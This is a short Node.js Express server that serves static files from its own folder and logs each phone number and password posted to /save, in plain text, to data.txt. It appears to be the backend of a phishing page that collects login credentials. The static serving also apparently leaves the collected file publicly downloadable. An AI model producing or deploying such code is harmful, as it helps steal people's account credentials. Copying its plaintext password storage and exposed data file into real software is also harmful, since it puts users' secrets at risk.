const express = require("express");
const fs = require("fs");

const app = express();
app.use(express.json());

app.use(express.static(__dirname));

app.post("/save", (req, res) => {
  const data = `${new Date().toISOString()} | ${req.body.phone} | ${req.body.password}\n`;
  fs.appendFileSync("data.txt", data);
  res.sendStatus(200);
});

app.listen(3000, () => {
  console.log("Server running: http://localhost:3000");
});

